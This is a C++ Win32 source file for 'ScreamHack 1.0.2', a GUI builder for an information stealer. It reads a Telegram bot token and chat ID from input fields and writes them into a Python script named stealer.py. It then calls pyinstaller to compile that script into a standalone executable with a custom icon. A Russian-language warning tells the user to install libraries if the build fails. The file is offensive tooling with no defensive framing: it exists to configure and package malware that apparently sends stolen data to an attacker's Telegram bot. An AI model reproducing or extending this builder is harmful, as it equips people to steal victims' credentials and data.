#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <windows.h>
#include <commdlg.h>
#include <vector>

void buildstealer() {
    system("start cmd /k pyinstaller --onefile Scripts\\tools\\stealer\\stealer.py -i Scripts\\tools\\stealer\\logo.png");
    std::cout << "Check - 'dist' folder";
}

HWND hChatId;
HWND hBotToken;
HWND hButton;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            hButton = CreateWindow(
                L"BUTTON",
                L"Build",
                WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                5, 5, 425, 30,
                hwnd,
                (HMENU)10,
                (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
                NULL
            );
            hChatId = CreateWindow(
                L"EDIT",
                L"YOUR CHAT ID",
                WS_TABSTOP | WS_VISIBLE | WS_CHILD | WS_BORDER | ES_LEFT,
                5, 40, 425, 20,
                hwnd,
                (HMENU)20,
                (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
                NULL
            );
            hBotToken = CreateWindow(
                L"EDIT",
                L"YOUR BOT TOKEN",
                WS_TABSTOP | WS_VISIBLE | WS_CHILD | WS_BORDER | ES_LEFT,
                5, 65, 425, 20,
                hwnd,
                (HMENU)20,
                (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
                NULL
            );
            
            SendMessage(hBotToken, EM_SETLIMITTEXT, 0xFFFFFFFF, 0);
            break;
        }
        case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
        case WM_COMMAND:
        if (LOWORD(wParam) == 10) {
            wchar_t chatIdBuffer[256];
            wchar_t botTokenBuffer[256];

            GetWindowText(hChatId, chatIdBuffer, 256);
            GetWindowText(hBotToken, botTokenBuffer, 256);

            std::wstring chatId(chatIdBuffer);
            std::wstring botToken(botTokenBuffer);

            std::wstring token = L"token = \"" + botToken + L"\" #YOUR TOKEN HERE";
            std::wstring chat_id = L"chat_id = \"" + chatId + L"\" #YOUR CHAT ID HERE";

            // Читаем существующее содержимое файла
            std::ifstream inFile("Scripts/tools/stealer/stealer.py");
            std::stringstream buffer;
            buffer << inFile.rdbuf();
            inFile.close();

            std::string line;
            std::vector<std::string> lines;
            while (std::getline(buffer, line)) {
                lines.push_back(line);
            }
            if (lines.size() > 2) {
                lines.erase(lines.begin(), lines.begin() + 2);
            } else {
                lines.clear();
            }

            std::ofstream outFile("Scripts/tools/stealer/stealer.py");
            if (outFile.is_open()) {
                outFile << std::string(token.begin(), token.end()) << std::endl;
                outFile << std::string(chat_id.begin(), chat_id.end()) << std::endl;
                for (const auto& remainingLine : lines) {
                    outFile << remainingLine << std::endl;
                }
                outFile.close();
            }

            std::wstring message = token + L"\n" + chat_id;
            MessageBox(hwnd, L"Если компиляция не происходит - попробуйте установить библиотеки.", L"Warn", MB_OK | MB_ICONERROR);
            buildstealer();
        } break;
    return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    const wchar_t CLASS_NAME[] = L"ScreamHack 1.0.2";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        L"ScreamHack 1.0.2",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 450, 200,
        NULL,
        NULL,
        hInstance,
        NULL
    );
    if (hwnd == NULL) {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
    }

    return 0;
}